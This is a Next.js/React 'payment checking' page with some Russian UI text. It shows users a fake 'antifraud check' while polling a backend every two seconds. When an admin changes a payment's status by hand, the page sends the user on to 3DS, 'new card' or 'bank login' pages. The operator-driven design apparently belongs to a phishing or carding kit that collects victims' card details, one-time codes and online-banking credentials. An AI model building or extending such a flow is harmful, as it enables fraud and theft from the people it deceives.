'use client'

import { useEffect, useState } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import { useParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { useTranslations } from 'next-intl'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Loader2, Shield, CreditCard, Building2, CheckCircle, XCircle } from 'lucide-react'

export default function PaymentCheckingPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated, user, isLoading } = useAuth()
  const t = useTranslations('payments')
  
  const paymentId = searchParams.get('payment_id')
  const amount = searchParams.get('amount')
  const currency = searchParams.get('currency')
  const userEmail = searchParams.get('user_email')
  
  const [checkingStatus, setCheckingStatus] = useState('checking')
  const [redirectUrl, setRedirectUrl] = useState<string | null>(null)

  // Check authentication
  useEffect(() => {
    if (!isLoading && !isAuthenticated) {
      router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments/checking?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)}`)
    }
  }, [isLoading, isAuthenticated, router, locale, paymentId, amount, currency, userEmail])

  // Poll payment status for admin actions - ALWAYS ACTIVE
  useEffect(() => {
    if (!paymentId || !isAuthenticated) return

    const pollInterval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentId || paymentId.length < 10) {
          console.error('Invalid payment ID format:', paymentId)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 Payment status polled:', status)

          // Check if admin has requested an action
          if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS - redirecting...')
            setRedirectUrl(`/${locale}/payments/3ds?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
            setCheckingStatus('redirecting_3ds')
          } else if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card - redirecting...')
            setRedirectUrl(`/${locale}/payments/new-card?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
            setCheckingStatus('redirecting_new_card')
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login - redirecting...')
            setRedirectUrl(`/${locale}/payments/bank-login?payment_id=${paymentId}&amount=${amount}&currency=${currency}&user_email=${userEmail}`)
            setCheckingStatus('redirecting_bank')
          } else if (status === 'approved') {
            console.log('✅ Payment approved by admin')
            setCheckingStatus('approved')
          } else if (status === 'rejected') {
            console.log('❌ Payment rejected by admin')
            setCheckingStatus('rejected')
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            setCheckingStatus('final')
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentId, isAuthenticated, locale, amount, currency, userEmail])

  // Handle redirect after admin action
  useEffect(() => {
    if (redirectUrl && (checkingStatus.startsWith('redirecting'))) {
      const timer = setTimeout(() => {
        router.push(redirectUrl)
      }, 1000) // Small delay to show redirect message

      return () => clearTimeout(timer)
    }
  }, [redirectUrl, checkingStatus, router])

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    )
  }

  if (!isAuthenticated) {
    return null
  }

  if (!paymentId || !amount || !currency) {
    router.push(`/${locale}/payments`)
    return null
  }

  return (
    <div className="container mx-auto px-4 py-8 max-w-md">
      <Card className="w-full">
        <CardHeader className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-blue-100">
            <Shield className="h-8 w-8 text-blue-600" />
          </div>
          <CardTitle className="text-xl">
            {checkingStatus === 'checking' && t('checking.title')}
            {checkingStatus === 'redirecting_3ds' && t('checking.redirecting_3ds')}
            {checkingStatus === 'redirecting_new_card' && t('checking.redirecting_new_card')}
            {checkingStatus === 'redirecting_bank' && t('checking.redirecting_bank')}
            {checkingStatus === 'approved' && 'Платеж одобрен'}
            {checkingStatus === 'rejected' && 'Платеж отклонен'}
            {checkingStatus === 'final' && t('checking.completed')}
          </CardTitle>
        </CardHeader>
        
        <CardContent className="text-center space-y-4">
          {checkingStatus === 'checking' && (
            <>
              <div className="flex items-center justify-center space-x-2">
                <Loader2 className="h-5 w-5 animate-spin text-blue-600" />
                <span className="text-sm text-gray-600">{t('checking.processing')}</span>
              </div>
              
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="flex items-center space-x-2 mb-2">
                  <CreditCard className="h-4 w-4 text-gray-500" />
                  <span className="text-sm font-medium">{t('checking.card_details')}</span>
                </div>
                <p className="text-xs text-gray-600">{t('checking.antifraud_check')}</p>
              </div>
              
              <p className="text-sm text-gray-500">
                {t('checking.wait_message')}
              </p>
            </>
          )}

          {checkingStatus.startsWith('redirecting') && (
            <>
              <div className="flex items-center justify-center space-x-2">
                <Loader2 className="h-5 w-5 animate-spin text-green-600" />
                <span className="text-sm text-green-600">
                  {checkingStatus === 'redirecting_3ds' && t('checking.redirecting_to_3ds')}
                  {checkingStatus === 'redirecting_new_card' && t('checking.redirecting_to_new_card')}
                  {checkingStatus === 'redirecting_bank' && t('checking.redirecting_to_bank')}
                </span>
              </div>
              
              <p className="text-sm text-gray-500">
                {t('checking.redirect_message')}
              </p>
            </>
          )}

          {checkingStatus === 'approved' && (
            <div className="space-y-3">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="h-8 w-8 text-green-600" />
                <span className="text-lg font-medium text-green-600">Платеж одобрен!</span>
              </div>
              <p className="text-sm text-gray-600">
                Ваш платеж был одобрен администратором и обрабатывается.
              </p>
              <Button
                onClick={() => router.push(`/${locale}/payments`)}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                Вернуться к платежам
              </Button>
            </div>
          )}

          {checkingStatus === 'rejected' && (
            <div className="space-y-3">
              <div className="flex items-center justify-center space-x-2">
                <XCircle className="h-8 w-8 text-red-600" />
                <span className="text-lg font-medium text-red-600">Платеж отклонен</span>
              </div>
              <p className="text-sm text-gray-600">
                К сожалению, ваш платеж был отклонен администратором.
              </p>
              <Button
                onClick={() => router.push(`/${locale}/payments`)}
                className="w-full bg-red-600 hover:bg-red-700"
              >
                Попробовать снова
              </Button>
            </div>
          )}

          {checkingStatus === 'final' && (
            <div className="space-y-3">
              <p className="text-sm text-gray-600">
                {t('checking.final_message')}
              </p>
              <Button 
                onClick={() => router.push(`/${locale}/payments`)}
                className="w-full"
              >
                {t('checking.back_to_payments')}
              </Button>
            </div>
          )}

          {checkingStatus === 'checking' && (
            <Button 
              variant="outline" 
              onClick={() => router.push(`/${locale}/payments`)}
              className="w-full"
            >
              {t('checking.cancel_payment')}
            </Button>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
